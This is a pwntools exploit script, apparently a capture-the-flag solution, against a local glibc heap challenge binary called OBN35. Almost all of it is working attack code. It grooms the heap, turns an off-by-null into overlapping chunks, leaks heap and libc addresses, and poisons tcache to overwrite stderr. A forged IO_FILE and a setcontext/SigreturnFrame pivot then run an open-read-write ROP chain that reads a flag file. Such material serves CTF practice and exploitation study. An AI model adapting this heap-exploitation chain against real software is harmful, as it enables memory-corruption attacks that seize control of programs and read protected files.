#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./OBN35')
libc = ELF('./libc.so.6')
elf = ELF('./OBN35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

# step1 P&0xff = 0

add(0x418) #0 A = P->fd
add(0x108) #1 barrier 可自由调整 barrier 大小，使 C0最后一个字节为 00 即可.
add(0x438) #2 B0 helper
add(0x438) #3 C0 = P , P&0xff = 0
add(0x108) #4 barrier
add(0x488) #5 H0 helper for write bk->fd vitcim chunk.
add(0x428) #6 D = P->bk
add(0x108) #7 barrier
add(0x108) #8 barrier

# =============================================
# step 2 use unsortedbin to set p->fd = A , p->bk = D

delete(0) # A
delete(3) # C0
delete(6) # D

# unsortedbin: D-C0-A   C0->FD = A
delete(2) # merge B0 with C0. preserve p->fd p->bk
add(0x458,'\x00' * 0x438 + p64(0x551)[:-2])  #9 put A,D into largebin, split BC. use B1 to set p->size = 0x551

# recovery
add(0x418) #10 C1 from ub
add(0x428) #11 bk  D from largebin
add(0x418) #12 fd  A from largebin

# =============================================
# step3 use unsortedbin to set fd->bk, partial overwrite fd->bk

delete(12) # A = P->fd
delete(10)  # C1
# unsortedbin: C1-A ,   A->BK = C1

add(0x418)  #13 A
edit(13, 'a' * 8) # partial \x00 overwrite bk  A->bk = p
add(0x418) #14

#=========================heapbase=============================

show(13)
heapbase = u64(p.recv(16)[-8:].ljust(8, "\x00")) - 0xc00
pr('heapbase',heapbase)

# =============================================
# step4 use ub to set bk->fd

delete(14) # C1
delete(11) # D = P->bk
# ub-D-C1    D->FD = C1
delete(5)  # merge D with H, preserve D->fd
add(0x500 - 8) #15 H1. bk->fd = p, partial write \x00
edit(15,'\x00'*0x488 + p64(0x431))
add(0x3b0) #16 recovery

# =============================================
# step5 off by null

edit(4, 0x100*'\x00' + p64(0x550)) # off by null, set fake_prev_size = 0x550, prev inuse=0
delete(15) # merge H1 with C0. trigger overlap C0,4,6

#=========================libcbase=============================

add(0x438) #17 put libc to chunk 4

show(4) # unsortedbin
libcbase = u64(p.recv(6).ljust(8, "\x00"))- 0x219ce0 # unsortedbin 与 libc 偏移 == 0x219ce0
pr('libcbase',libcbase)

#==============================================================

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
setcontext_door = libcbase + libc.sym['setcontext'] + 61
stderr_addr = libcbase + libc.sym['stderr']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret
ret = prdi_ret + 1 # ret

#==========================stderr==============================

delete(17) # consolidate
add(0x458, 0x438*'\x00' + p64(0x111)) #18 fix size for chunk 4. 6 overlap 4
delete(7) # tcachebin
delete(4) # tcachebin
stderr = ((heapbase + 0x1050) >> 12) ^ stderr_addr
edit(18, 0x438*'\x00' + p64(0x111) + p64(stderr)) # set chunk4->fd = stderr
add(0x100, p64(stderr)) #19
add(0x100, p64(heapbase + 0x290)) #20 stderr

#==========================top_size============================

delete(8)  # tcachebin
delete(19) # tcachebin
top_size_addr = heapbase + 0x1c30
top_size = ((heapbase + 0x1050) >> 12) ^ top_size_addr
edit(18, 0x438*'\x00' + p64(0x111) + p64(top_size)) # set chunk4->fd = top_size_addr
add(0x100, p64(top_size)) #21
add(0x100, p64(0) + p64(0x501)) #22 top chunk

edit(18, '\x00'*0x18 + p64(0x421)) # fix size for C1

#======================fake_IO_FILE============================

context_addr  = heapbase + 0x1660
IO_FILE_addr  = heapbase + 0x290

fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(0) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(0) # _IO_buf_base
fake_IO_FILE += p64(1) + p64(0) # _IO_buf_base != _IO_buf_end
fake_IO_FILE += p64(context_addr) # rdx-> context_addr
fake_IO_FILE += p64(setcontext_door) # _IO_save_end = call(setcontext + 61)
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr + 0x30) # _wide_data = rax1
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps + 0x10) # vtable = _IO_wfile_xsputn + 0x10 = _IO_wfile_seekoff
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(IO_FILE_addr + 0x40)  # rax2

#=============================orw==============================

frame = SigreturnFrame()
frame.rsp  = context_addr + 0x100 # rsp->orw
frame.rip  = ret

payload  = str(frame)
payload  = payload.ljust(0x100,'\x00')
flag_addr = context_addr + 0x200

# ORW
# open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

# read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

# write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload  = payload.ljust(0x200,'\x00') + './flag\x00\x00'

#==============================================================

edit(13, fake_IO_FILE)
edit(16, payload)

p.sendlineafter(':','1')
p.sendlineafter('len:',str(0x600)) # 触发 __malloc_assert
p.interactive()